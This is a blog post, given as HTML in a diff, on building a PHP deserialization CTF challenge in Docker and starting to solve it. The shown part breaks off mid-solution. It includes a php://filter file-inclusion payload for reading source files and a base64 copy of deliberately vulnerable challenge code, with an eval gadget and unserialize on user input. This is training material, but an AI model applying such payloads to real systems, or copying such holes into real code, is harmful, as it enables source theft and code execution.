@@ -1,0 +1,609 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="Qhkk" />
+
+
+
+<meta name="description" content="1.安装配置Docker1yum install -y yum-utils device-mapper-persistent-data lvm2  1.1.由于自带 yum 没有 Docker-CE 所以我们需要先增加 docker repo：1yum-config-manager --add-repo https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;centos&#x2F;docker">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php反序列化题目搭建">
+<meta property="og:url" content="http://example.com/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/index.html">
+<meta property="og:site_name" content="Qhkk&#39;s blog">
+<meta property="og:description" content="1.安装配置Docker1yum install -y yum-utils device-mapper-persistent-data lvm2  1.1.由于自带 yum 没有 Docker-CE 所以我们需要先增加 docker repo：1yum-config-manager --add-repo https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;centos&#x2F;docker">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651583864901-e5b4af24-eddf-4290-8384-8d825f2e0d5a.png">
+<meta property="og:image" content="http://example.com/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651661174171-2b855952-4f8e-44d4-84a9-282dd7a3ccf7.png">
+<meta property="og:image" content="http://example.com/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651686284952-01544360-6e5e-4373-8c4c-623ba2d6b20f.png">
+<meta property="og:image" content="http://example.com/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651686331118-bdfd517d-af4f-4a5d-af16-4c8da17d0d8a.png">
+<meta property="og:image" content="http://example.com/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651662614998-18bad023-7f2f-463b-adc0-9f6ddcd75213.png">
+<meta property="og:image" content="http://example.com/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651666819761-eedd907b-22f7-4ce7-81f1-2e848f7c0e1f.png">
+<meta property="og:image" content="http://example.com/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651685137661-b1e8b596-caee-4411-855c-0dfa2c1febc0.png">
+<meta property="og:image" content="http://example.com/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651686617235-862358e0-6737-4416-ab5c-c9965e58e37e.png">
+<meta property="og:image" content="http://example.com/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651686657670-3be2b579-c7f1-43fa-ad08-2fb2b5a89dfb.png">
+<meta property="og:image" content="http://example.com/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651686816318-f7be5b4b-9baf-48d3-a78d-8f3711dbc40c.png">
+<meta property="og:image" content="http://example.com/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651725794242-b8404a68-edcf-4391-bf80-b4ebb02a7e99.png">
+<meta property="og:image" content="http://example.com/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651726822105-f0614581-42e1-45f5-8274-d7764a6da664.png">
+<meta property="og:image" content="http://example.com/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651726861800-2e6c2bc6-a92c-4fb0-a3c8-776628dc07ff.png">
+<meta property="article:published_time" content="2022-05-04T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-05-28T07:43:54.174Z">
+<meta property="article:author" content="Qhkk">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651583864901-e5b4af24-eddf-4290-8384-8d825f2e0d5a.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="Qhkk&#39;s blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>php反序列化题目搭建 | Qhkk&#39;s blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: 
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/"></a></h1>
+        </hgroup>
+
+        
+
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于前端</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-php反序列化题目搭建" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/" class="article-date">
+      <time datetime="2022-05-04T16:00:00.000Z" itemprop="datePublished">2022-05-05</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      php反序列化题目搭建
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="1-安装配置Docker"><a href="#1-安装配置Docker" class="headerlink" title="1.安装配置Docker"></a>1.安装配置Docker</h2><figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y yum-utils device-mapper-persistent-data lvm2</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-1-由于自带-yum-没有-Docker-CE-所以我们需要先增加-docker-repo："><a href="#1-1-由于自带-yum-没有-Docker-CE-所以我们需要先增加-docker-repo：" class="headerlink" title="1.1.由于自带 yum 没有 Docker-CE 所以我们需要先增加 docker repo："></a>1.1.由于自带 yum 没有 Docker-CE 所以我们需要先增加 docker repo：</h3><figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum-config-manager --add-repo https:<span class="comment">//download.docker.com/linux/centos/docker-ce.repo</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-用-yum-安装-Docker："><a href="#1-2-用-yum-安装-Docker：" class="headerlink" title="1.2.用 yum 安装 Docker："></a>1.2.用 yum 安装 Docker：</h3><figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y docker-ce</span><br></pre></td></tr></table></figure>
+
+<p>报错：<img src="/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651583864901-e5b4af24-eddf-4290-8384-8d825f2e0d5a.png" alt="img"></p>
+<p>出现以上错误，根据提示在命令行后加上 <code>--nobest</code>或<code>--allowerasing</code></p>
+<figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y docker-ce --allowerasing</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-3-直接yum安装，安装成功后查看版本："><a href="#1-3-直接yum安装，安装成功后查看版本：" class="headerlink" title="1.3.直接yum安装，安装成功后查看版本："></a>1.3.直接yum安装，安装成功后查看版本：</h3><figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -v</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-4-启动docker："><a href="#1-4-启动docker：" class="headerlink" title="1.4.启动docker："></a>1.4.启动docker：</h3><figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-5-设置开机启动："><a href="#1-5-设置开机启动：" class="headerlink" title="1.5.设置开机启动："></a>1.5.设置开机启动：</h3><figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig docker <span class="keyword">on</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-6配置Docker："><a href="#1-6配置Docker：" class="headerlink" title="1.6配置Docker："></a>1.6配置Docker：</h3><p>因为国内访问 Docker Hub 较慢, 可以使用腾讯云提供的国内镜像源, 加速访问 Docker Hub，依次执行以下命令；</p>
+<figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;OPTIONS=<span class="string">&#x27;--registry-mirror=https://mirror.ccs.tencentyun.com&#x27;</span>&quot; &gt;&gt; /etc/sysconfig/docker</span><br><span class="line"></span><br><span class="line">systemctl daemon-reload</span><br><span class="line"></span><br><span class="line">service docker restart</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-使用docker搭建ctf题目"><a href="#2-使用docker搭建ctf题目" class="headerlink" title="2.使用docker搭建ctf题目"></a>2.使用docker搭建ctf题目</h2><h3 id="2-1搜索lamp环境的docker镜像"><a href="#2-1搜索lamp环境的docker镜像" class="headerlink" title="2.1搜索lamp环境的docker镜像"></a>2.1搜索lamp环境的docker镜像</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search lamp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651661174171-2b855952-4f8e-44d4-84a9-282dd7a3ccf7.png" alt="img"></p>
+<h3 id="2-2拉取tutum-x2F-lamp镜像"><a href="#2-2拉取tutum-x2F-lamp镜像" class="headerlink" title="2.2拉取tutum&#x2F;lamp镜像"></a>2.2拉取tutum&#x2F;lamp镜像</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull tutum/lamp</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3拉取完成后，查看本地docker镜像"><a href="#2-3拉取完成后，查看本地docker镜像" class="headerlink" title="2.3拉取完成后，查看本地docker镜像"></a>2.3拉取完成后，查看本地docker镜像</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
+
+<p><img src="/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651686284952-01544360-6e5e-4373-8c4c-623ba2d6b20f.png" alt="img"></p>
+<h3 id="2-4新建一个docker容器"><a href="#2-4新建一个docker容器" class="headerlink" title="2.4新建一个docker容器"></a>2.4新建一个docker容器</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p <span class="number">100</span>:<span class="number">80</span> -p <span class="number">3307</span>:<span class="number">3306</span> tutum/lamp</span><br><span class="line"><span class="comment">#-d 容器后台运行。</span></span><br><span class="line"><span class="comment">#-p 指定映射端口。</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-5查看系统中运行的docker容器。"><a href="#2-5查看系统中运行的docker容器。" class="headerlink" title="2.5查看系统中运行的docker容器。"></a>2.5查看系统中运行的docker容器。</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
+
+<p><img src="/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651686331118-bdfd517d-af4f-4a5d-af16-4c8da17d0d8a.png" alt="img"></p>
+<h3 id="2-6使用浏览器访问访问一下主页，查看映射是否正常"><a href="#2-6使用浏览器访问访问一下主页，查看映射是否正常" class="headerlink" title="2.6使用浏览器访问访问一下主页，查看映射是否正常"></a>2.6使用浏览器访问访问一下主页，查看映射是否正常</h3><p><img src="/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651662614998-18bad023-7f2f-463b-adc0-9f6ddcd75213.png" alt="img"></p>
+<h3 id="2-7将ctf题目源码拷贝到container的主目录中"><a href="#2-7将ctf题目源码拷贝到container的主目录中" class="headerlink" title="2.7将ctf题目源码拷贝到container的主目录中"></a>2.7将ctf题目源码拷贝到container的主目录中</h3><p><strong>windows上传文件夹到linux服务器</strong>：</p>
+<p>E:&gt;scp -rp &#x2F;pop username@<em><strong>.</strong></em>.<em><strong>.</strong></em>:&#x2F;web</p>
+<p>username@<em><strong>.</strong></em>.<em><strong>.</strong></em>‘s password:</p>
+<p>复制windows本地E:&#x2F;pop目录到远程服务器***.<em><strong>.</strong></em>.***的&#x2F;web目录</p>
+<p>-r 递归复制子文件夹内容<br>-p 保留原文件修改，访问时间和权限（modes）信息</p>
+<p><img src="/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651666819761-eedd907b-22f7-4ce7-81f1-2e848f7c0e1f.png" alt="img"></p>
+<p>查看：</p>
+<p><img src="/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651685137661-b1e8b596-caee-4411-855c-0dfa2c1febc0.png" alt="img"></p>
+<p>将其复制到容器中：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker cp -a /web c642e5bcb088:/<span class="keyword">var</span>/www/html</span><br><span class="line"></span><br><span class="line"><span class="comment">//-a, --archive  Archive mode (copy all uid/gid information)</span></span><br><span class="line"><span class="comment">//归档模式（复制所有UID / GID信息）</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-8进入docker-container"><a href="#2-8进入docker-container" class="headerlink" title="2.8进入docker container"></a>2.8进入docker container</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker exec -i -t c642e5bcb088 /bin/bash</span><br><span class="line">  </span><br><span class="line"><span class="comment">#如果从这个容器退出，不会导致容器的停止，推荐使用 docker exec</span></span><br><span class="line"><span class="comment">#-i //让容器的标准输入保持打开。</span></span><br><span class="line"><span class="comment">#-t //让docker分配一个伪终端并绑定到容器的标准输出上。</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651686617235-862358e0-6737-4416-ab5c-c9965e58e37e.png" alt="img"></p>
+<h3 id="2-9进入容器中的数据库，创建好ctf题目需要的数据库、数据表等等"><a href="#2-9进入容器中的数据库，创建好ctf题目需要的数据库、数据表等等" class="headerlink" title="2.9进入容器中的数据库，创建好ctf题目需要的数据库、数据表等等"></a>2.9进入容器中的数据库，创建好ctf题目需要的数据库、数据表等等</h3><p><img src="/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651686657670-3be2b579-c7f1-43fa-ad08-2fb2b5a89dfb.png" alt="img"></p>
+<h3 id="2-10安装docker-compose"><a href="#2-10安装docker-compose" class="headerlink" title="2.10安装docker-compose"></a>2.10安装docker-compose</h3><p>运行以下命令以下载 Docker Compose 的当前稳定版本：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L https:<span class="comment">//get.daocloud.io/docker/compose/releases/download/v2.4.1/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose</span></span><br></pre></td></tr></table></figure>
+
+<p>将可执行权限应用于二进制文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>
+
+<p>创建软链：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose</span><br></pre></td></tr></table></figure>
+
+<p>测试是否安装成功：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure>
+
+<p><img src="/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651686816318-f7be5b4b-9baf-48d3-a78d-8f3711dbc40c.png" alt="img"></p>
+<h2 id="3-解题part"><a href="#3-解题part" class="headerlink" title="3.解题part"></a>3.解题part</h2><p><img src="/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651725794242-b8404a68-edcf-4391-bf80-b4ebb02a7e99.png" alt="img"></p>
+<p>打开后显示题目在hint.php,打开发现源码</p>
+<p><img src="/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651726822105-f0614581-42e1-45f5-8274-d7764a6da664.png" alt="img">发现文件包含，利用协议来读取文件，先来尝试读取flag.php：<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">关于伪协议</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+
+<p>得到如下结果：</p>
+<p><img src="/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/1651726861800-2e6c2bc6-a92c-4fb0-a3c8-776628dc07ff.png" alt="img"></p>
+<p>&#x2F;&#x2F;base64解码</p>
+  <?php
+
+  I'm not a real flag
+
+  ?>
+
+<p>是个假的flag</p>
+<p>读取首页index.php的源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag=php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure>
+
+<p>得到的密文解码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">PD9waHANCmNsYXNzIFRpZ2Vyew0KICAgIHB1YmxpYyAkc3RyaW5nOw0KICAgIHByb3RlY3RlZCAkdmFyOw0KICAgIHB1YmxpYyBmdW5jdGlvbiBfX3RvU3RyaW5nKCl7DQogICAgICAgIHJldHVybiAkdGhpcy0+c3RyaW5nOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gYm9zcygkdmFsdWUpew0KICAgICAgICBAZXZhbCgkdmFsdWUpOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gX19pbnZva2UoKXsNCiAgICAgICAgJHRoaXMtPmJvc3MoJHRoaXMtPnZhcik7DQogICAgfQ0KfQ0KDQpjbGFzcyBMaW9uew0KICAgIHB1YmxpYyAkdGFpbDsNCiAgICBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoKXsNCiAgICAgICAgJHRoaXMtPnRhaWwgPSBhcnJheSgpOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gX19nZXQoJHZhbHVlKXsNCiAgICAgICAgJGZ1bmN0aW9uID0gJHRoaXMtPnRhaWw7DQogICAgICAgIHJldHVybiAkZnVuY3Rpb24oKTsNCiAgICB9DQp9DQoNCg0KY2xhc3MgTW9ua2V5ew0KICAgIHB1YmxpYyAkaGVhZDsNCiAgICBwdWJsaWMgJGhhbmQ7DQogICAgcHVibGljIGZ1bmN0aW9uIF9fY29uc3RydWN0KCRoZXJlPSJab28iKXsNCiAgICAgICAgJHRoaXMtPmhlYWQgPSAkaGVyZTsNCiAgICAgICAgZWNobyAiV2VsY29tZSB0byAiLiR0aGlzLT5oZWFkLiI8YnI+IjsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIF9fd2FrZXVwKCl7DQogICAgICAgIGlmKHByZWdfbWF0Y2goIi9nb3BoZXJ8aHR0cHxmaWxlfGZ0cHxodHRwc3xkaWN0fFwuXC4vaSIsICR0aGlzLT5oZWFkKSkgew0KICAgICAgICAgICAgZWNobyAiaGFja2VyIjsNCiAgICAgICAgICAgICR0aGlzLT5zb3VyY2UgPSAiaW5kZXgucGhwIjsNCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KY2xhc3MgRWxlcGhhbnR7DQogICAgcHVibGljICRub3NlOw0KICAgIHB1YmxpYyAkbmljZTsNCiAgICBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJG5pY2U9Im5pY2UiKXsNCiAgICAgICAgJHRoaXMtPm5pY2UgPSAkbmljZTsNCiAgICAgICAgZWNobyAkbmljZTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIF9fdG9TdHJpbmcoKXsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5uaWNlLT5ub3NlOw0KICAgIH0NCn0NCg0KaWYoaXNzZXQoJF9QT1NUWyd6b28nXSkpew0KICAgIEB1bnNlcmlhbGl6ZSgkX1BPU1RbJ3pvbyddKTsNCn0NCmVsc2V7DQogICAgJGEgPSBuZXcgTW9ua2V5Ow0KICAgIGVjaG8gImhpbnQgaW4gaGludC5waHAhIjsNCn0NCj8+</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span 